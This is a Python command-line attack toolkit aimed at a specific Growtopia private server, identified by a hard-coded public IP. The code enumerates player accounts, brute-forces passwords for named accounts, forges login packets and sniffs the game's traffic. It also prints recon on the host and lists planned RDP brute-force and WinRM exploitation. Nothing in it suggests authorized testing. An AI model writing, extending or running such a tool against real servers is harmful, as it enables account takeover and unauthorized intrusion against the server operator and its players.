#!/usr/bin/env python3
"""
Piter Tools CLI — GTPS Attack Toolkit
======================================
Advanced Growtopia Private Server exploitation toolkit.
Sniff, forge, brute, MITM — everything.

USAGE:
  piter_cli.py sniff      - Sniff UDP traffic (needs tcpdump/root)
  piter_cli.py scan       - Scan for existing GrowIDs
  piter_cli.py forge ID PASS - Forge login packet
  piter_cli.py brute WORDLIST - Brute force GrowID enumeration
  piter_cli.py monitor   - Live traffic monitor + session tracker
  piter_cli.py info      - Server info / recon
  
REQUIRES: Python 3.7+ (stdlib only, no pip deps)
"""

import sys
import os
import time
import subprocess
import json
import struct
import threading
from datetime import datetime
from pathlib import Path

# Add parent dir for local imports
sys.path.insert(0, os.path.dirname(__file__))
from piter_tools.exploit import PiterAuth, PacketForger, SessionTracker, AuthResult

PITER_IP = "103.129.148.178"
PITER_PORT = 17091

BANNER = """
  ╔══════════════════════════════════════╗
  ║     PITER TOOLS — GTPS Attack Kit   ║
  ║        Target: 103.129.148.178      ║
  ╚══════════════════════════════════════╝
"""

# ──── MODE: scan ────
def cmd_scan():
    """Quick scan: probe common GrowIDs for existence."""
    common = [
        "piterp", "admin", "Owner", "PiterAdmin", "PiterOwner",
        "root", "system", "Administrator", "piteradmin", "server",
        "PiterServer", "gtpsadmin", "nabenns",
    ]
    
    print("\n[*] Piter Server — Account Scanner")
    print(f"[*] Testing {len(common)} common GrowIDs...\n")
    
    auth = PiterAuth(timeout=2.0)
    found = []
    
    for gid in common:
        result = auth.probe_growid(gid, "scan_probe_123")
        
        if result.exists and result.logged_in:
            print(f"  [!!!] {gid}: LOGGED IN! (this shouldn't happen with wrong password)")
            found.append((gid, "LOGGED_IN"))
        elif result.exists:
            print(f"  [+] {gid}: EXISTS (invalid credentials)")
            found.append((gid, "EXISTS"))
        elif result.raw_response and len(result.raw_response) > 10:
            print(f"  [?] {gid}: Unknown response ({len(result.raw_response)}B)")
        else:
            print(f"  [-] {gid}: not found / no response")
    
    if found:
        print(f"\n[RESULT] {len(found)} existing accounts:")
        for name, status in found:
            print(f"  {name} ({status})")
        print("\n[!] These accounts can be targeted for password brute-force")
        print("[!] Run: python3 piter_cli.py brute-pass <GrowID> <wordlist>")
    else:
        print("\n[-] No known accounts found from common list.")
        print("[*] Try a custom wordlist: python3 piter_cli.py brute <wordlist.txt>")


# ──── MODE: forge ────
def cmd_forge(grow_id: str, password: str):
    """Send raw ENet login packet to server."""
    print(f"\n[*] Forging login: {grow_id} / {password}")
    print(f"[*] Target: {PITER_IP}:{PITER_PORT}\n")
    
    auth = PiterAuth()
    packet = auth.build_login_packet(grow_id, password)
    
    print(f"  Packet: {len(packet)} bytes")
    print(f"  Hex: {packet[:32].hex()}...")
    print()
    
    resp = auth._send_recv(packet)
    
    if resp is None:
        print("  [-] No response (server didn't answer)")
        return
    
    print(f"  [+] Response: {len(resp)} bytes")
    print(f"  Hex: {resp[:64].hex()}")
    
    try:
        text = resp.decode('utf-8', errors='replace')
        if any(c.isalpha() for c in text[:30]):
            print(f"  Text: {text[:500]}")
    except:
        pass
    
    # Parse tank fields
    from piter_tools.protocol import parse_tank_fields
    fields = parse_tank_fields(resp)
    if fields:
        print(f"\n  [TANK FIELDS]")
        for k, v in fields.items():
            masked = v
            if k.lower() in ('tankidpass', 'password', 'pass'):
                masked = v[:2] + '*' * max(0, len(v)-2)
            print(f"    {k}: {masked}")


# ──── MODE: brute ────
def cmd_brute(wordlist_path: str):
    """Brute force GrowID enumeration from wordlist."""
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        sys.exit(1)
    
    with open(wordlist_path) as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    
    print(f"\n[*] Piter Server — GrowID Brute Force")
    print(f"[*] Wordlist: {wordlist_path} ({len(lines)} entries)")
    print(f"[*] Target: {PITER_IP}:{PITER_PORT}\n")
    
    auth = PiterAuth(timeout=2.0)
    found = []
    tested = 0
    
    start = time.time()
    results = auth.brute_force_growids(lines, on_find=lambda g: print(f"  [+] FOUND: {g}"))
    
    for r in results:
        if r.exists:
            found.append(r)
    
    elapsed = time.time() - start
    
    print(f"\n[DONE] Tested {len(results)} GrowIDs in {elapsed:.0f}s")
    print(f"[RESULT] {len(found)} accounts exist:")
    for r in found:
        print(f"  {r.grow_id}")
    
    if found:
        print(f"\n[!] Next: brute passwords for discovered accounts")
        print(f"[!] Run: python3 piter_cli.py brute-pass <GrowID> <passwords.txt>")


# ──── MODE: brute-pass ────
def cmd_brute_pass(grow_id: str, wordlist_path: str):
    """Brute force password for a known GrowID."""
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        sys.exit(1)
    
    with open(wordlist_path) as f:
        passwords = [l.strip() for l in f if l.strip()]
    
    print(f"\n[*] Password brute force for: {grow_id}")
    print(f"[*] Testing {len(passwords)} passwords...\n")
    
    auth = PiterAuth(timeout=2.0)
    found = auth.try_password_list(grow_id, passwords)
    
    if found:
        print(f"\n[!!!] JACKPOT! Password for {grow_id}: {found}")
        print(f"[!!!] Login: python3 piter_cli.py forge {grow_id} {found}")
    else:
        print(f"\n[-] Password not found in wordlist.")


# ──── MODE: monitor ────
def cmd_monitor():
    """Live traffic monitor using tcpdump."""
    print(f"\n[*] Piter Server — Live Traffic Monitor")
    print(f"[*] Target: {PITER_IP}:{PITER_PORT}")
    print(f"[*] Press Ctrl+C to stop\n")
    
    tracker = SessionTracker()
    packet_count = 0
    
    cmd = [
        '/usr/sbin/tcpdump', '-i', 'any', '-n', '-l',
        f'udp and port {PITER_PORT} and host {PITER_IP}'
    ]
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, bufsize=0)
    except FileNotFoundError:
        cmd[0] = 'tcpdump'
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, bufsize=0)
    except Exception as e:
        print(f"[!] Can't start tcpdump: {e}")
        sys.exit(1)
    
    print("  TIME      DIR  SIZE  PROTO     INFO")
    print("  --------- ---  ----  --------  ----")
    
    try:
        for line_bytes in proc.stdout:
            line = line_bytes.decode('utf-8', errors='replace').strip()
            
            if 'UDP' not in line:
                continue
            
            packet_count += 1
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Parse tcpdump line
            if '>' in line:
                parts = line.split('>')
                src = parts[0].strip()
                dst = parts[1].split(':')[0].strip() if ':' in parts[1] else parts[1].strip()
            else:
                src, dst = '?', '?'
            
            # Direction
            if PITER_IP in src:
                direction = "←"
            else:
                direction = "→"
            
            # Extract length
            length = '?'
            if 'length' in line.lower():
                len_idx = line.lower().find('length')
                length = line[len_idx + 7:].split()[0].rstrip(':')
            
            print(f"  {timestamp} {direction}   {length:>4s}B  UDP       {src}:{dst}")
            
            # Session tracking
            tracker.feed_packet(src, b'')
            
    except KeyboardInterrupt:
        proc.terminate()
        proc.wait()
    
    # Summary
    active = tracker.get_active_players(max_idle=300)
    print(f"\n[DONE] {packet_count} packets captured")
    print(f"[ACTIVE] {len(active)} endpoints active in last 5 min")


# ──── MODE: sniff (full packet capture) ────  
def cmd_sniff(output_file: str = ""):
    """Full packet capture mode — intercept ENet payloads."""
    print(f"\n[*] Piter Server — Full Packet Sniffer")
    print(f"[*] Capturing raw UDP payloads on port {PITER_PORT}")
    print(f"[*] Target: {PITER_IP}")
    
    if output_file:
        out = open(output_file, 'w')
        print(f"[*] Output: {output_file}")
    else:
        out = None
    
    print(f"[*] Press Ctrl+C to stop\n")
    print(f"  OPEN GROWTOPI → LOGIN AS nabenns NOW")
    print(f"  {'─'*50}")
    
    # Python raw socket approach
    try:
        import socket as sock_mod
        sock = sock_mod.socket(sock_mod.AF_INET, sock_mod.SOCK_RAW, sock_mod.IPPROTO_UDP)
        sock.settimeout(1)
    except PermissionError:
        print("[!] Need root. Try: sudo python3 piter_cli.py sniff")
        sys.exit(1)
    
    packet_count = 0
    start_time = time.time()
    
    try:
        while True:
            try:
                data, addr = sock.recvfrom(65535)
            except sock_mod.timeout:
                continue
            
            if len(data) < 28:
                continue
            
            ip_hdr = data[:20]
            protocol = ip_hdr[9]
            if protocol != 17:
                continue
            
            src_ip = sock_mod.inet_ntoa(ip_hdr[12:16])
            dst_ip = sock_mod.inet_ntoa(ip_hdr[16:20])
            
            udp_hdr = data[20:28]
            src_port = struct.unpack('!H', udp_hdr[0:2])[0]
            dst_port = struct.unpack('!H', udp_hdr[2:4])[0]
            
            if PITER_PORT not in (src_port, dst_port):
                continue
            
            payload = data[28:]
            if len(payload) == 0:
                continue
            
            packet_count += 1
            
            direction = "→" if dst_ip == PITER_IP else "←"
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            
            line = f"[{ts}] #{packet_count} {direction} {src_ip}:{src_port} → {dst_ip}:{dst_port} ({len(payload)}B)"
            print(line)
            
            if out:
                out.write(line + '\n')
                out.write(f"  HEX: {payload[:64].hex()}\n")
                
                # Try decode as text
                try:
                    text = payload.decode('utf-8', errors='replace')
                    printable = ''.join(c if 32 <= c < 127 else '.' for c in text)
                    if any(c.isalpha() for c in printable[:20]):
                        out.write(f"  ASCII: {printable[:200]}\n")
                except:
                    pass
                
                # Check for tank fields
                from piter_tools.protocol import parse_tank_fields
                fields = parse_tank_fields(payload)
                if fields:
                    for k, v in fields.items():
                        masked = v
                        if k.lower() in ('tankidpass', 'password'):
                            masked = v[:2] + '*' * max(0, len(v)-2)
                        out.write(f"  FIELD: {k}={masked}\n")
                
                out.flush()
    
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[DONE] {packet_count} packets in {elapsed:.0f}s")
        sock.close()
        if out:
            out.close()
            print(f"[SAVED] {output_file}")


# ──── MODE: info ────
def cmd_info():
    """Display target info and recon summary."""
    print(f"\n  Target Information")
    print(f"  {'─'*50}")
    print(f"  IP:            {PITER_IP}")
    print(f"  Game Port:     UDP {PITER_PORT}")
    print(f"  Hostname:      WIN-1UJSONVI5IS")
    print(f"  OS:            Windows Server 2022 (10.0.20348)")
    print(f"  RDP:           TCP 3389 (NLA/CredSSP)")
    print(f"  WinRM:         TCP 5985")
    print(f"  HTTP:          TCP 80 (PHP 8.3), TCP 443 (Express)")
    print(f"  Game Mgmt:     TCP 5000 (Express)")
    print(f"  Auth Type:     FAKE — HTTP accepts all credentials")
    print(f"  Real Auth:     ENet game server (player files on disk)")
    print(f"  Meta:          halokontoldiran")
    print(f"  Module:        Piter Server (DRASTORE-based)")
    print(f"  Other UDP:     15303, 15840, 16009, 17000-17002")
    print()
    print(f"  Exploit Vectors")
    print(f"  {'─'*50}")
    print(f"  1. GrowID enumeration (scan / brute modes)")
    print(f"  2. Password brute force (brute-pass mode)")
    print(f"  3. MITM proxy (packet sniff + modify)")
    print(f"  4. RDP brute force (hydra - in progress)")
    print(f"  5. WinRM exploitation (port 5985)")
    print(f"  6. ENet protocol injection (forge mode)")
    print()
    print(f"  Discovered Accounts")
    print(f"  {'─'*50}")
    print(f"  nabenns (exists — password unknown)")
    print()


# ──── MAIN ────
def usage():
    print("""
Piter Tools CLI — GTPS Attack Toolkit

COMMANDS:
  info              Server recon / target info
  scan              Quick scan for common GrowIDs
  forge <ID> <PASS> Forge ENet login packet
  brute <WORDLIST>  Brute force GrowID enumeration
  brute-pass <ID> <WORDLIST>  Brute force password for known GrowID
  monitor           Live traffic monitor (tcpdump)
  sniff [OUTPUT]    Full packet capture to file
  
EXAMPLES:
  python3 piter_cli.py info
  python3 piter_cli.py scan
  python3 piter_cli.py forge piterp 123456
  python3 piter_cli.py brute names.txt
  python3 piter_cli.py brute-pass admin passwords.txt
  sudo python3 piter_cli.py sniff piter_dump.txt
  sudo python3 piter_cli.py monitor
""")


if __name__ == "__main__":
    args = sys.argv[1:]
    
    if not args:
        usage()
        sys.exit(0)
    
    cmd = args[0].lower()
    
    if cmd == "info":
        cmd_info()
    
    elif cmd == "scan":
        cmd_scan()
    
    elif cmd == "forge":
        if len(args) < 3:
            print("[!] Usage: piter_cli.py forge <GrowID> <password>")
            sys.exit(1)
        cmd_forge(args[1], args[2])
    
    elif cmd == "brute":
        if len(args) < 2:
            print("[!] Usage: piter_cli.py brute <wordlist.txt>")
            sys.exit(1)
        cmd_brute(args[1])
    
    elif cmd == "brute-pass":
        if len(args) < 3:
            print("[!] Usage: piter_cli.py brute-pass <GrowID> <passwords.txt>")
            sys.exit(1)
        cmd_brute_pass(args[1], args[2])
    
    elif cmd == "monitor":
        cmd_monitor()
    
    elif cmd == "sniff":
        output = args[1] if len(args) > 1 else None
        cmd_sniff(output)
    
    else:
        print(f"[!] Unknown command: {cmd}")
        usage()
        sys.exit(1)
